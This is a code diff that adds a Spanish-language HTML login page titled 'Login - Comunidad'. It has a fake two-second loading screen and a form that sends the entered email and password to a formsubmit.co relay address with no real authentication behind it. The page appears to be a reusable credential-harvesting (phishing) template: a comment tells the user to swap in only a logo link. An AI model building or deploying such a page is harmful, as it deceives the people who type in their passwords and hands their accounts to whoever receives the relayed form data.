@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login - Comunidad</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #0f172a;
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      overflow: hidden;
+    }
+
+    /* Pantalla de carga */
+    #loader {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: #0f172a;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      z-index: 9999;
+    }
+
+    #loader img {
+      width: 150px;
+      height: auto;
+      border-radius: 12px;
+      animation: spin 3s linear infinite;
+    }
+
+    @keyframes spin {
+      from { transform: rotate(0deg); }
+      to { transform: rotate(360deg); }
+    }
+
+    /* Caja de login */
+    #login {
+      display: none;
+      max-width: 350px;
+      width: 90%;
+      background: #1e293b;
+      padding: 20px;
+      border-radius: 12px;
+      box-shadow: 0px 0px 20px rgba(0,0,0,0.5);
+    }
+
+    #login h2 {
+      text-align: center;
+      margin-bottom: 20px;
+      color: #38bdf8;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0;
+      border: none;
+      border-radius: 8px;
+      font-size: 14px;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      background: #38bdf8;
+      color: #0f172a;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    button:hover {
+      background: #0ea5e9;
+    }
+  </style>
+</head>
+<body>
+  <!-- Pantalla de carga con logo girando -->
+  <div id="loader">
+    <!-- SOLO CAMBIA EL ENLACE DE TU LOGO -->
+    <img src="TU_ENLACE_DE_LOGO.png" alt="Logo">
+  </div>
+
+  <!-- Pantalla de login -->
+  <div id="login">
+    <h2>Inicia Sesión</h2>
+    <form action="https://formsubmit.co/b58372e3afafe5f908daf1b0cc3c700f" method="POST">
+      <input type="email" name="email" placeholder="Tu correo" required>
+      <input type="password" name="password" placeholder="Tu contraseña" required>
+      <button type="submit">Ingresar</button>
+    </form>
+  </div>
+
+  <script>
+    // Simula la carga
+    window.onload = function() {
+      setTimeout(() => {
+        document.getElementById('loader').style.display = 'none';
+        document.getElementById('login').style.display = 'block';
+      }, 2000); // 2 segundos
+    }
+  </script>
+</body>
+</html>
